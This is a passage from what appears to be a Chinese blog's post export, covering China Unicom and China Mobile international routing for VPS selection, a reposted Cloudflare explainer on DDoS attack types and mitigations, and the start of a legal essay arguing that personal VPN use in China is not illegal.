NTT，垃圾的一批；部分线路不错的机房，如安畅机房、沙田、香港阿里云、PCCW 等，一般直接从广州联通过去，到港走香港联通或香港 PCCW，但这种机房一般都是针对三网一起优化的，联通当然跑的也不差，除非兼顾其他运营商的访问者，否则联通用户没必要花大价钱选择三网优化的香港地区机房。 日本地区，表现之好，花费之低，超乎想象，尤其是众多日本本土 VPS 商（如 Cloudgarage、IDCF、Kagoya、Conoha、Sakura、ABLENET、GMOCloud等），联通用户去/回程统一经过上海联通的 IIJ 线路，质量非常理想，且上述日本本土商家的月付价格普遍不高，非常值得联通用户的选择，诸如 Linode 东京区二（Linode 东京区一走纯 KDDI 线路，联通表现也不错，可惜早已绝版）/ Vultr 东京等机房，走的是 NTT 线路，线路质量奇差，虽然它们购买门槛低，但非常不值得选择，买之前一定要测一下。 不少研究日本 VPS 的同学，都知道中日之间有一条品级最高的线路，名曰 bbtec ，我有必要单独拿出来说一下，它是日本软银(Soft Bank)的定制线路，神壕专属，价格昂贵。日本阿里云有在用这条线路，但一个是接入该线路的 VPS 商家本来就不多，产品难寻，还有就是阿里云日本的账号注册限制太严，非日本本土手机号＋无日本国内住所无法收到纸质注册确认信并寄回就不能买，这就挡住几乎所有国内人了。我印象里能勉强买到，且提供 bbtec 的只还有 Ucloudbiz，他家机房实际在韩国首尔，IP 地址映射到的日本福冈，XEN 虚拟架构，不如主流的 KVM 先进，价格也不便宜。另一方面就是感觉 bbtec 这款线路高不成低不就的：对电信用户，bbtec 国内部分并未接入 CN2，走得依旧是 163，该卡还是卡，且日本地区根本就没有 CN2 GIA 产品，所以中国电信用户在任何时候都绝不应该选择任何一家日本地区的 VPS，加多少钱都没有更好的效果；对联通用户而言，有物美价廉的 IIJ 为何要选它；对移动用户而言，没有任何特殊加成，还得从广州过去，舍近求远，你高攀不起，它爱搭不理，bbtec 线路我觉得没有任何入手价值。 韩国地区，韩国地区的 VPS 市场竞争不充分，可以购买的本地商家不多，大多由国人代理运营，印象减分，再加上韩国地区比较严厉的互联网成人内容管制政策，韩国 VPS 有一条 porn 墙，不值得选择。 俄罗斯地区，毛熊的不少线路对联通用户是比较友好的，与中国临近，地理位置不吃亏，价格比较实惠。联通统一从北京出发，经过 Rostelecom (https://rt.ru) 线路过去，来回新西伯利亚机房的质量普遍比莫斯科的要好。但还有以下这些无法克服的问题：1. 用俄语难以跟客服沟通；2. 不支持支付宝，paypal，付款困难；3. 别想着用来给美服、港服吃鸡，游戏加速，俄罗斯地区连接香港和美国的延迟极高；4. 同理，移动固网用户会先去香港，再去俄罗斯，延迟很高；5. 如果是建站，只有中国联通、欧洲用户访问过去的速度不错，全世界其他地区连接俄罗斯的速度都不理想，随着国力衰弱，俄罗斯网络设施的可利用价值不太高； 海外国人运营，支持支付宝付款，价格奇低，非一线大厂，NTT 线路，犄角旮旯地区，符合上述六条规则中的三条，打死都别碰，碰就是交学费。 一个典型的中国联通 169 网络连接外网路径图: 169 网络的中美回程也不绕路: 169 网络也比较看中对方 VPS 商的线路优化: 御三家：Linode/Vultr/DigitalOcean 新加坡节点电信/联通去程绕日，费拉不堪: 普通新加坡线路回程部分从广州直连回来，部分依旧绕日: IIJ 线路对联通十分友好，非常适合中国华东、华南地区的联通用户选择: 珍爱生命，远离 NTT: 生活在中国东北、华北地区，且预算有限的联通用户，可以试试俄罗斯 VPS: 中国联通 A 网 AS9929 路由拓扑图，图示来源：https://bgp.he.net/AS9929 IPv4： IPv6： 说明： 169 网络和 A 网之间的区别，与 163 网络和 CN2 之间的区别并不是一个概念，A 网早在中国网通时代就已存在，属于中国网通的骨干网。在网通和联通合并后，联通仍继续建设当年从电信 163 网分出来的那一部分，即现如今的 169 网(分出来的原因是应当年政企分离的要求，不是电信自己分的)，而这张 A 网就闲置了。虽然该产品的定位，名义上和中国电信的 CN2 网络对标，但这张“吃老本”的 A 网所具备的优势仅仅是用户少，网络负荷小，所以表现也还不错，一般给政企、高端用户使用。但由于这张网络多年没有再发展，所以跟持续扩容的 CN2 比，质量方面的差距只会越来越大。 从市级 → 省级 → 国际出口 → 境外接入点的过程中，全程走 AS 号为 9929 的路由节点，这些路由节点的 IP 地址开头一律是 “218.105../210...*”，部分偏远地区，会经过 169 网络汇入到 A 网； 由于该网的建设初衷就是为国内的网络服务，A 网仅会出现在国内，去程出海后一律并入到 169 网络上；回程必须要经过 169 网络，走到国内部分才转入到 A 网，这是所谓“精品 A 网”与 CN2 网络之间最大的差别； 通过 A 网络访问外网全天的丢包率在 1% ~ 2%左右，如果在夜晚间高峰期（UTC+8 18:00 至 23:00 时），丢包率可达到 3% 以上； 这个网的技术并不先进，用的人只要变多，或是负责出海数据去回的 169 网炸了，就顿露马脚。 一个典型的中国联通 A 网回程路由: 对方网络没做优化的情况下，A 网回程也不会绕路: 红框圈起来的就是传说中的 A 网，出海后果然便汇入到 169 网络上: 3. 中国移动 中国移动进出国际网络，在国内经过的绝大部分流量，均由 AS9808 网络承载，旧铁通的 AS9314 网络几乎已被放弃； 暂未发现中国移动有“精品出口网络”产品； AS9808 网络在北京/上海/广州均有进出海光缆，距多方 Traceroute 观察，广州移动承担了大部分中国移动网络进出口的流量，如中美、中国东南亚等地区； PCCW 与中国移动有着说不清道不明的屁眼交易关系； 上海移动仅提供分散广州移动出口流量的职能，且流经上海移动的流量，会转交给国内其他运营商（如联通）进行国际通信； 北京移动主要承担与欧洲地区进出口流量的通信（直连，非绕美）； 网络路由路径遵守固定路径/边界网关协议（BGP）； 暂未确定在高峰期是否会有策略性丢包，以减少对骨干网的负载； 通过手机用户赠宽带等方式，中国移动迅速积累了一大批固网宽带用户，在总出口量排行老三、总用户量跃居国内第一的情况下，如果不大幅拓展国际总出口量，未来普通移动网络用户的国际互联网访问质量着实堪忧。 中国移动 AS9808 路由拓扑图，图示来源：https://bgp.he.net/AS9808 IPv4： IPv6： 说明： 中国移动的进出口跳跃性很大，国内部分必走 AS9808 路由（221.176../221.183..），在部分地区访问部分 VPS，会并入到铁通 AS9314/电信 163 网络/联通 169 网络的路由节点； 目前来看，中国移动网络的国际访问质量中规中矩，尤其是电信用户谈之色变的东南亚未优化 VPS 线路（一般要从日本 NTT 过去或是绕美），在移动用户看来真是小 Case，如果不能通过广州移动直接过去，那就呆在广州移动绕一圈再过去； PCCW（电讯盈科） 线路目前是中港之间或是从中国到东南亚其他地区前且必须从香港中转线路的中，国内除纯 CN2 GIA 以外质量最好的线路； 以前移动就有“国内墙中墙，国外直接上”的优良传统，通过 AS9808 网络访问外网全天的丢包率在 1% ~ 3%左右，如果在夜晚间高峰期（UTC+8 18:00 至 23:00 时），丢包率可达到 3% 以上； 国内部分需经过的路由节点较多； 回程和去程的路径很少恶意绕路。 绕道联通 直连且有独立的中美线路 访问 Vultr 新加坡的线路质量很不错，三网最佳 对于位于香港的服务器，VPS 商如果和移动有合作，则全程走中国移动线路，否则走 PCCW 北京移动主要负责处理欧洲地区的外网通信 谨记木桶理论 即使有“全程 CN2”、“A 网”等“精品网络”光环加持，一定不要忘了，网络速度、延迟、丢包等关键指标，还与 VPS 商的销售行为息息相关，就比如说，商家标称“共享 1Gbps”，如果平均分给 8 个人用，每个人能享受到的速度就是 128Mbps，但如果商家贪心，把 VPS 超售 10 倍（无论是 OpenVZ/KVM/HyperV 等架构，网络端口都可以为所欲为地超售），那么每个人在高峰期只能享用 12.8 Mbps 的带宽，如果你的邻居们各个都是“一键脚本”大神，什么锐速、暴力魔改 BBR、KCPTun 多倍狂发包 等争抢网络资源的奇技淫巧一股脑儿使劲怼，而你什么优化也不做时，自然就更吃亏，源头速度被卡死了，国家给你单独铺一条海缆也没用。 #牢记品质三原色 ","link":"https://blog.gd1214b.icu/post/EbWtYgMvU/"},{"title":"DDoS科普系列：什么是 DDoS 攻击？","content":" 本文转自：https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/ 什么是 DDoS 攻击？ 分布式拒绝服务（DDoS）攻击是通过大规模互联网流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。 DDoS 攻击利用多台受损计算机系统作为攻击流量来源以达到攻击效果。利用的机器可以包括计算机，也可以包括其他联网资源（如 IoT 设备）。 总体而言，DDoS 攻击好比高速公路发生交通堵塞，妨碍常规车辆抵达预定目的地。 DDoS 攻击的工作原理 DDoS 攻击是通过连接互联网的计算机网络进行的。 这些网络由计算机和其他设备（例如 IoT 设备）组成，它们感染了恶意软件，从而被攻击者远程控制。这些个体设备称为机器人（或僵尸），一组机器人则称为僵尸网络。 一旦建立了僵尸网络，攻击者就可通过向每个机器人发送远程指令来发动攻击。 当僵尸网络将受害者的服务器或网络作为目标时，每个机器人会将请求发送到目标的 IP 地址，这可能导致服务器或网络不堪重负，从而造成对正常流量的拒绝服务。 由于每个机器人都是合法的 Internet 设备，因而可能很难区分攻击流量与正常流量。 如何识别 DDoS 攻击 DDoS 攻击最明显的症状是网站或服务突然变慢或不可用。但是，造成类似性能问题的原因有多种（如合法流量激增），因此通常需要进一步调查。流量分析工具可以帮助您发现 DDoS 攻击的一些明显迹象： * 来自单个 IP 地址或 IP 范围的可疑流量 * 来自共享单个行为特征（例如设备类型、地理位置或 Web 浏览器版本）的用户的大量流量 * 对单个页面或端点的请求数量出现不明原因的激增 * 奇怪的流量模式，例如一天中零碎时间上的激增或看似不自然的模式（例如，每 10 分钟出现一次激增） DDoS 攻击还有其他更具体的迹象，具体取决于攻击的类型。 常见的 DDoS 攻击有哪几类 不同类型的 DDoS 攻击针对不同的网络连接组件。为了解不同的 DDoS 攻击如何运作，有必要知道网络连接是如何建立的。 互联网上的网络连接由许多不同的组件或“层”构成。就像打地基盖房子一样，模型中的每一步都有不同的用途。 OSI 模型（如下图所示）是一个概念框架，用于描述 7 个不同层级的网络连接。 虽然几乎所有 DDoS 攻击都涉及用流量淹没目标设备或网络，但攻击可以分为三类。攻击者可能利用一种或多种不同的攻击手段，也可能根据目标采取的防范措施循环使用多种攻击手段。 应用程序层攻击 攻击目标： 此类攻击有时称为第 7 层 DDoS 攻击（指 OSI 模型第 7 层），其目标是耗尽目标资源。 攻击目标是生成网页并传输网页响应 HTTP 请求的服务器层。在客户端执行一项 HTTP 请求的计算成本比较低，但目标服务器做出响应却可能非常昂贵，因为服务器通常必须加载多个文件并运行数据库查询才能创建网页。 第 7 层攻击很难防御，因为难以区分恶意流量和合法流量。 应用程序层攻击示例： HTTP 洪水 HTTP 洪水攻击类似于同时在大量不同计算机的 Web 浏览器中一次又一次地按下刷新 – 大量 HTTP 请求涌向服务器，导致拒绝服务。 这种类型的攻击有简单的，也有复杂的。 较简单的实现可以使用相同范围的攻击 IP 地址、referrer 和用户代理访问一个 URL。复杂版本可能使用大量攻击性 IP 地址，并使用随机 referrer 和用户代理来针对随机网址。 协议攻击 攻击目标： 协议攻击也称为状态耗尽攻击，这类攻击会过度消耗服务器资源和/或防火墙和负载平衡器之类的网络设备资源，从而导致服务中断。 协议攻击利用协议堆栈第 3 层和第 4 层的弱点致使目标无法访问。 协议攻击示例： SYN 洪水 SYN 洪水就好比补给室中的工作人员从商店的柜台接收请求。 工作人员收到请求，前去取包裹，再等待确认，然后将包裹送到柜台。一时之间，工作人员收到太多包裹请求，来不及确认，直到无法处理更多包裹，实在不堪重负，致使无人能对请求做出回应。 此类攻击利用 TCP 握手（两台计算机发起网络连接时要经过的一系列通信），通过向目标发送大量带有伪造源 IP 地址的 TCP“初始连接请求”SYN 数据包来实现。 目标计算机响应每个连接请求，然后等待握手中的最后一步，但这一步确永远不会发生，因此在此过程中耗尽目标的资源。 容量耗尽攻击 攻击目标： 此类攻击试图通过消耗目标与较大的 Internet 之间的所有可用带宽来造成拥塞。攻击运用某种放大攻击或其他生成大量流量的手段（如僵尸网络请求），向目标发送大量数据。 放大示例： 如何防护 DDoS 攻击？ 若要缓解 DDoS 攻击，关键在于区分攻击流量与正常流量。 例如，如果因发布某款产品导致公司网站涌现大批热情客户，那么全面切断流量是错误之举。如果公司从已知恶意用户处收到的流量突然激增，或许需要努力缓解攻击。 难点在于区分真实客户流量与攻击流量。 在现代互联网中，DDoS 流量以多种形式出现。流量设计可能有所不同，从非欺骗性单源攻击到复杂的自适应多方位攻击无所不有。 多方位 DDoS 攻击采用多种攻击手段，以期通过不同的方式击垮目标，很可能分散各个层级的缓解工作注意力。 同时针对协议堆栈的多个层级（如 DNS 放大（针对第 3/4 层）外加 HTTP 洪水（针对第 7 层））发动攻击就是多方位 DDoS 攻击的一个典型例子。 为防护多方位 DDoS 攻击，需要部署多项不同策略，从而缓解不同层级的攻击。 一般而言，攻击越复杂，越难以区分攻击流量与正常流量 —— 攻击者的目标是尽可能混入正常流量，从而尽量减弱缓解成效。 如果缓解措施不加选择地丢弃或限制流量，很可能将正常流量与攻击流量一起丢弃，同时攻击还可能进行修改调整以规避缓解措施。为克服复杂的破坏手段，采用分层解决方案效果最理想。 黑洞路由 有一种解决方案几乎适用于所有网络管理员：创建黑洞路由，并将流量汇入该路由。在最简单的形式下，当在没有特定限制条件的情况下实施黑洞过滤时，合法网络流量和恶意网络流量都将路由到空路由或黑洞，并从网络中丢弃。 如果互联网设备遭受 DDoS 攻击，则该设备的互联网服务提供商（ISP）可能会将站点的所有流量发送到黑洞中作为防御。这不是理想的解决方案，因为它相当于让攻击者达成预期的目标：使网络无法访问。 速率限制 限制服务器在某个时间段接收的请求数量也是防护拒绝服务攻击的一种方法。 虽然速率限制对于减缓 Web 爬虫窃取内容及防护暴力破解攻击很有帮助，但仅靠速率限制可能不足以有效应对复杂的 DDoS 攻击。 然而，在高效 DDoS 防护策略中，速率限制不失为一种有效手段。 Web 应用程序防火墙 Web 应用程序防火墙（WAF） 是一种有效工具，有助于缓解第 7 层 DDoS 攻击。在互联网和源站之间部署 WAF 后，WAF 可以充当反向代理，保护目标服务器，防止其遭受特定类型的恶意流量入侵。 通过基于一系列用于识别 DDoS 工具的规则筛选请求，可以阻止第 7 层攻击。有效的 WAF 的一个关键价值是能够快速实施自定义规则以应对攻击。 Anycast 网络扩散 此类缓解方法使用 Anycast 网络，将攻击流量分散至分布式服务器网络，直到网络吸收流量为止。 这种方法就好比将湍急的河流引入若干独立的小水渠，将分布式攻击流量的影响分散到可以管理的程度，从而分散破坏力。 Anycast 网络在缓解 DDoS 攻击方面的可靠性取决于攻击规模及网络规模和效率。 ","link":"https://blog.gd1214b.icu/post/gfV9Uqj8F/"},{"title":"个人使用vpn\"翻墙\"是否违法？——基于规范性法律文件、案例以及相关计算机技术的分析与讨论","content":" 本文转自:https://mp.weixin.qq.com/s?__biz=Mzg2OTIyMzY0Ng==&amp;mid=2247483696&amp;idx=1&amp;sn=5fd8a3d57308bdbf993ab7545c141a8e&amp;chksm=cea11c81f9d69597487bf17018dba4d329a491c98abed4d6f1b1a88a83abcd2a2d8cfe18a2c7&amp;scene=158#rd 本文旨在分析“翻墙”行为的法律风险，并基于现行规范性法律文件和相关案例进行学术讨论。在分析相关法条时可能需要对部分计算机专业术语进行释义。但本文不涉及有关“翻墙”的任何技术指导或方法的具体介绍。 另，本文讨论的一切“XXX合法与违法”问题，分析的主体都是“单纯访问境外网站”，不包括“访问、发布、传播违法有害信息”，后者当然属于违法犯罪行为，但这和翻墙行为没有任何本质联系，因为在境内网站也可访问、发布、传播违法有害信息。 在本文大致框架形成以前，我已查阅国内几乎所有关于“翻墙”的论文和文章，大部分探讨都存在着严重的问题，有些是法学常识性问题（或不讨论法律层面的问题），有些是计算机技术方面的常识性问题（常出现在法学类文章中）。 这是一个很有趣的现象——“翻墙”是一个同时牵涉法学和计算机技术的两个领域的跨学科问题。很多法学专家不了解技术；很多技术人员，也没有意愿探讨技术涉及的法律问题。这个疑难问题今天终于被我这个“既没学好法，又没学好计算机”的奇葩捡了漏。望两个学科的大佬们对于本文可能出现的纰漏予以指正！ 如果你能完整阅读完这篇一万余字的文章（的第一章、第二章部分），你最大的收获，就是能够认识到某律所文章的部分段落（见下文引用部分）在论证中犯下的严重前提错误： 由于企业的“翻墙”行为既未使用合法的“国际出入口信道”，也未接入合法的“接入网络”，甚至未使用境内的“互联网络”，已经违反了《中华人民共和国计算机信息网络国际联网管理暂行规定》的规定，公安机关有权责令企业停止国际联网行为，同时给予警告，并处以15000元以下的罚款。 在看完第四章的基础上），你将对“GFW”、“翻墙”等话题有更深入、更正确的认识，同时避免被不怀好意的人的类似观点（见下文引用部分）欺骗。 因为全球大部分根域名服务器都设立在美国，所以美国掌握互联网的底层，而中国必须建立GFW来保障互联网安全。这也是互联网+产业安全运转的重要基础。 本文论证的逻辑链如下： 国际出入口信道是物理信道，现行法只规定不允许非法架设物理信道——翻墙必定使用合法物理信道（主要在第四章展开论证）——翻墙不违法 本文的主要结论如下： “个人使用vpn等工具翻墙”的禁止性规定是不存在的，无论是从技术角度还是法律方面，访问境外网站和境内网站没有任何本质区别； 一切翻墙行为都必须使用国家批准的合法国际出入口信道，因为全球互联网的本来面貌就是所有国家网络基建的互联互通（主要在第四章展开论证）； GFW的运行基本原理是“网络攻击或入侵检测”（主要在第四章展开论证）； “翻墙”的基本原理是抵御“网络攻击或入侵检测”（主要在第四章展开论证）。 案例导入及相关材料真实性的检证 2018年12月28日，广东韶关南雄市公安局对“翻墙”的朱某某作出行政处罚决定，理由为“擅自建立、使用非法定信道进行国际联网”，处以1000元人民币罚款，其处罚依据为《中华人民共和国计算机信息网络国际联网管理暂行规定》第六条、第十四条。 广东公安执法信息公开平台行政处罚决定书信息 韶雄公(网)行罚决字 [2019]1号 http://www.gdgafz.alldayfilm.com/bookDetail.html?type=1&amp;id=1134323 笔者此前看到此新闻时一度是不相信的，但未曾料到，近日在检索过程中真的在官方信息公开平台查到了这一案件的处罚决定。但上图显示的“行政处罚决定书”拍摄样图并非来源于官方，且样图有很多可疑之处（法律文书课老师看到可能会被气哭），在此提前予以指出： 标准模板，横线是提前固定的，但细看便可发现，正文文字下划线与页面的边距不统一，因此这明显是在正文文字填写之后才事后加上“下划线”格式的。且文字没有统一边距； 在“现查明”的正文部分，“‘蓝灯’（Lantern Pro）软件APP”中的“软件”和“APP”系表意相同的两个名词，此处连用存在语病，十分怪异； 在内容部分，“且最近一周的登陆次数为487次”并没有相应的证据材料予以佐证。首先，行政相对人不可能记住自己使用vpn的连接次数，因此该数据不可能从询问笔录中反映出来。 其次，手机app本身并不会保存每天的连接次数，也没有日志的功能； 此外，即使该数据在手机和app内部以日志的形式保存，行政机关也不可能靠妄加猜测突然检查朱某某的手机，而是只可能使用远程手段（例如公安机关远程监控系统、电信运营商的举报或直接向运营商收集用户访问境外ip地址相关信息），但这样的证据并没有在此份决定书样图中反映出来，所以在证据层面是可疑的。 另附一份我在实习期间曾经手的一份行政处罚决定书的模板（关键信息已经隐藏）。从图中可见，基层机关行政处罚决定书的格式和行文要求是非常高的。而前后两相比较，可以看出前一份处罚决定书颇有些山寨的味道。 当然，上述文书所反映的问题并不必然证明其为刻意捏造，因为笔者对于不同地区基层行政机关的法律文书和执法水平差异并不了解，但至少上述缺陷会降低该材料的可信度。 法条分析及相关专业名词释义 上述行政处罚案件的处罚依据如下: 《中华人民共和国计算机信息网络国际联网管理暂行规定》（国务院令第195号）（1996年1月23&gt;日） 第六条 计算机信息网络直接进行国际联网，必须使用邮电部国家公用电信网提供的国际出入口信道。任何单位和个人不得自行建立或者使用其他信道进行国际联网。 第十四条 违反本规定第六条、第八条和第十条的规定的，由公安机关责令停止联网，给予警告，可以并处15000元以下的罚款；有违法所得的，没收违法所得。 关于发布《计算机信息网络国际联网出入口信道管理办法》的通知（邮部〔１９９６〕４９２号） 第二条 我国境内的计算机信息网络直接进行国际联网，必须使用邮电部国家公用电信网提供的国际出入口信道。 任何单位和个人不得自行建立或者使用其它信道（含卫星信道）进行国际联网。 什么是邮电部国家公用电信网提供的国际出入口信道？ 有很多人一看到“自行建立或使用”、“国际出入口信道”就激动地跳了起来，认为其含义和“使用vpn访问境外网站”是同一种意思，但实际上这是一个非常大的误解。 首先，从立法渊源上看，“国际出入口信道”一词最早起源于1996年出台的《中华人民共和国计算机信息网络国际联网管理暂行规定》（下称暂行规定）和关于发布《计算机信息网络国际联网出入口信道管理办法》的通知（邮部〔１９９６〕４９２号）（下称管理办法）。但很遗憾，在两部规范性法律文件内，并没有对“国际出入口信道”作出释义。但从后者的第二条第二款我们可以从“（含卫星信道）”这一标注中洞察到“信道”可能的含义——即它很可能具有物理意义。 好在，1998年国务院信息化领导小组又出台了一部相关的部门规章，对“国际出入口信道”的含义作出了明确的规定。 关于印发《中华人民共和国计算机信息网络国际联网管理暂行规定实施办法》的通知 （国信［１９９８］００１号） 第三条 本办法下列用语的含义是： （三）国际出入口信道，是指国际联网所使用的物理信道。 因此，国际出入口物理信道，只限于陆地光缆、海底光缆以及卫星通讯等实际存在的、供国内外进行数据、信息交换的物理介质。 根据《电信业务分类目录（2015年版）》，国际联网所使用的物理信道包括但不限于以下几种：国际陆缆、国际海缆、陆地入境站、海缆登陆站、国际地面传输通道、国际卫星地球站、卫星空间段资源、国际传输通道的国内延伸段，以及国际通信网带宽、光通信波长、电缆、光纤、光缆等国际通信传输设施。 与此同时，我们在立法中可以发现不少细节，其足以就“国际出入口信道属于物理信道”这一论点找出进一步的佐证。 首先必须对GFW的渊源有一定的了解。 防火长城（英语：Great Firewall，常用简称：GFW，中文也称中国国家防火墙，中国大陆民众俗称墙、网络长城、功夫网等等），是对中华人民共和国政府在其互联网边界审查系统（包括相关行政审查系统）的统称。此系统起步于1998年，其英文名称得自于2002年5月17日Charles R. Smith所写的一篇关于中国网络审查的文章《The Great Firewall of China》，取与Great Wall（长城）相谐的效果，简写为Great Firewall，缩写GFW。 来源:维基百科:https://zh.wikipedia.org/wiki/防火长城 可以发现，GFW项目在1998年才刚刚起步，其命名甚至在2002年才出现，继而才出现“翻墙”这一概念。1996年《中华人民共和国计算机信息网络国际联网管理暂行规定》出台之时，甚至没有GFW这一概念的存在，事实上也根本不存在互联网审查，那么，1996年、1998年规范性法律文件中的概念何以提前预测并指向1998年以后才诞生的事物？一项禁止性规定又何以禁止不存在的东西？ 因此，毫不避讳地说，若国内各地基层公安机关真的广泛存在“依据上述规范性法律文件对公民的‘翻墙’行为予以处罚”的现象，那绝对是明显的适用法律错误。 更进一步，《暂行规定》为“擅自设立非法国际出入口信道”的行为设定了行政处罚事项，而该处罚的裁量基准是“15000元人民币以下”。这个数字，从当今的经济水平来看，对于个人来说不算一个很大的数字（但实际上这个上限对于个人来说已经很高了）。但是我们不要忘了，设立该处罚事项的规范性法律文件是在1996年出台的，我们必须关注1996年前后的职工平均工资水平，才能洞察“1万5”在行政裁量基准上的合理与否。 关于公布上海市1998年度职工月平均工资、国有企业职工年平均工资及增长率的通知 二、1998年度全市国有企业职工年平均工资为11546元，比上年增长0.8%（增幅按国家统计局新口径作了相应调整）。凡按1998年国有企业职工年平均工资计算的事项，均按此水平执行。 沪劳保综发（1999）18号 上海市劳动和社会保障局 （来源：http://law.51labour.com/lawshow-36037.html） 你很难想象，在1998年，上海市作为全国经济重镇，职工的年平均工资才1万余元，但“翻一次墙”的行政处罚上限就可以达到一个上海普通职工工作一年半获得的工资——这不仅完全与行政法比例原则相违背，且即使是没有法学基础的人看到这样的景象都会感到震惊和难以置信。因此，我们从行政处罚的裁量基准可以反推得出，触犯上述规定的行政相对人，更可能是资本力量雄厚的企业——毕竟，一家有能力往台湾海峡私拉电线埋下海底光缆、或者为了“逛推特”专门制造并发射私人通信卫星的企业，才可能承受1万5的罚金。“建立国际出入口信道”，还真不是你普通人玩得起的！ 但很有意思的是，《暂行规定》历经20多年，裁量基准竟然从未发生变化，依旧是上限一万五。但是1996年的一万五和2020年的一万五，可完全不是一个数量级的。但立法部门竟然从没有想着修订，也着实让人奇怪。 1996年的“国际出入口信道”的概念在20年间是否发生变化 有人会进一步质疑，“国际出入口信道”这一概念，有没有可能随着时代的发展以及新规范性法律文件的出台，从而被赋予新的内涵和外延呢？我们不妨找一找最近几年的相关文件和新闻来分析一下。 为了推动中国与塔吉克斯坦、巴基斯坦间国际通信业务的共同发展，促进区域的共同繁荣，工业和信息化部批准中国电信设置塔什库尔干国际通信信道出入口，为中亚、南亚区域经济发展提供良好的通信平台和保障。 中塔直达光缆的建设，可以满足中塔间双边落地业务需求……（省略）……中巴直达光缆的建设将从根本上改变……（省略）……，满足中把双边落地及转接业务需求，对巴基斯坦国际出入口带宽能力的丰富和提升具有重大战略意义。 工业和信息化部批准设置塔什库尔干国际通信信道出入口 发布时间：2011-06-27 来源：电信管理局 链接:http://www.miit.gov.cn/n1146290/n1146402/n7039597/c7065495/content.html 首先，从2011年工业和信息化部的“批准设置塔什库尔干国际通信信道出入口”的新闻中，我们可以明显看出一个因果联系，即【国际出入口的设立→提升了国际出入口带宽能力】，而只有物理意义的光缆才可能事实上增强数据出入境的吞吐量，虚拟网络连接是做不到的，因此很容易进一步推导得出——“设置国际通信信道出入口”其本身就是“建设直达光缆”，因此，此时“信道”仍然是物理意义上的。 进一步，从近期的规范性法律文件来看，与“翻墙”关系最密切的莫过于工业和信息化部关于清理规范互联网网络接入服务市场的通知（工信部信管函[2017]32号） 以及工业和信息化部办公厅关于深入推进互联网网络接入服务市场清理规范工作的通知（工信厅信管函〔2018〕161号）。 工业和信息化部办公厅关于深入推进互联网网络接入服务市场清理规范工作的通知 但随着清理规范工作深入开展，一些深层次矛盾逐步浮出水面，部分企业违规自建传输网络、非法经营传输业务及违规经营跨境数据通信等问题仍较为突出，……（省略）……有关事项通知如下： 四、各基础电信企业要加强网络资源和用户台账管理，采取技术、管理、法律等措施，防范网络资源被用于非法经营。要配合各通信管理局做好违规线索核查，及时关停被用于非法经营、违规使用的网络资源。 工业和信息化部关于清理规范互联网网络接入服务市场的通知（工信部信管函[2017]32号） 二、工作重点 （二）严格资源管理，杜绝违规使用 4.违规开展跨境业务问题。未经电信主管部门批准，不得自行建立或租用专线（含虚拟专用网络VPN）等其他信道开展跨境经营活动。基础电信企业向用户出租的国际专线，应集中建立用户档案，向用户明确使用用途仅供其内部办公专用，不得用于连接境内外的数据中心或业务平台开展电信业务经营活动。 看到这两份文件的一些措辞，很多人又会将“专线（含虚拟专用网络VPN）等其他信道”等同于1996年、1998年文件提及的“国际出入口信道”，但两者是不同的概念。 首先应当明确的是，两者的规制主体范围是不同的，1996年文件针对的是所有企业和个人，而2017年文件仅限于跨境业务经营的企业；96年文件中“国际出入口信道”概念的外延仍然受到1998年《中华人民共和国计算机信息网络国际联网管理暂行规定实施办法》的限制，即其外延仅限于物理层面的信道，而2017年文件中的“专线”（含虚拟专用网络VPN）同时包含物理层面的信道以及虚拟专用网络。因此，前者（因“信道”的物理性而）不限制个人使用虚拟vpn，后者也（因规制主体不包括个人而）不限制个人使用虚拟vpn。 另外，分析法条不能脱离于立法背景，之所以将17年、18年两份文件并列展示，是因为两者立法在“规制vpn”领域的意图是一致的——“部分企业违规自建传输网络、非法经营传输业务及违规经营跨境数据通信等问题仍较为突出”、“防范网络资源被用于非法经营”。其表明，相关文件的出台针对的是企业违规跨境经营以及无资质企业非法经营网络服务（包括云服务、CDN服务），但与个人访问境外网站皆无直接关系。 值得一提的是，虽然上述文件是为了规制“企业违规使用vpn服务”的乱象，但其具体的措施却是将市场上一切没有相关资质的vpn服务全部一刀切，而相当多的vpn服务的主要受众是普通大众。因此，从名义上，政府规制的是企业违规跨境经营，但实际上对于个人用户访问境外网站产生了极为深远的消极影响，一个很直观的事实就是——自2018年以来，apple store的所有vpn软件全部下架。因此，其公开的立法目的和最后的政策效果是有很大差距的。 当我们讨论“翻墙行为”究竟是否违法时，我们首先应该讨论什么 我认为近些年人们对于“翻墙”的研究和讨论有些本末倒置了。 行政法规作出一个禁止性规定，首先要有禁止的主体和对象。换言之，在我们讨论“翻墙违法性”之前，我们应当先讨论到底什么是“墙”，“墙”到底存不存在。 这道墙在我们每个人眼中看来，显然它是事实存在的。我在上一篇文章提及一个想法——“在一个个生活事实和亲身体验中，人的大脑永远不会欺骗自己”。但是，生活事实和亲身体验很可能影响我们对于一件事情在法律意义上的判断——因为人们倾向于相信，如果一件事情在生活中是被事实禁止的，那么他就一定规定在了法条上。 但实际上： 没有任何一个公开的规范性文件规定过：个人不允许访问境外网站。 没有一个哪怕是效力最低的红头文件敢声称：访问youtube、Twitter是违法的。 如果你觉得有，请带着法条来找我（但请不要携带上述我提及的规范性法律文件来找我）。 其实到这一段为止，关于个人翻墙的法律问题已经全部讲完了，但还没有形成完整的逻辑链。因为上文只解决了大前提的问题，若没有论证翻墙行为的本质这一小前提，那么就不能得出翻墙合法或违法的结论。因此在下面一节，我提前总结了技术方面的几个重要结论（虽然不是法律问题，不应放在这一章），它们的论证部分统一放在本文第四章，其论证过程是相当庞杂和啰嗦的，因此第四章仅供感兴趣的朋友们阅读。而对于大多数人来说，看完下一节的结论性总结（且无条件相信的话），对于个人翻墙问题的讨论实际上已经可以就此终结了。 翻墙行为是否属于私自架设物理信道？ 上文，我们明确了现行法对于个人上网的禁止性规定只限于“禁止违规搭建违法物理信道”，那么翻墙是否就是其字面意思——从一堵墙私拉一根网线翻过去呢？答案是否定的。 在看完第四章的互联网技术讨论部分，你会对以下几个重要事实有基本的认识。 （1） 任何人通过任何手段访问任何境外网站，不管是合法手段还是非法手段，不管是访问合法网站还是有违法信息的网站，其必定要通过中国电信、中国联通和中国移动三家电信运营商（经批准）架设的陆上或海底光缆。因此，翻墙不可能违反关于“物理信道”的规定，如果有，那就是适用法律错误。 （2） 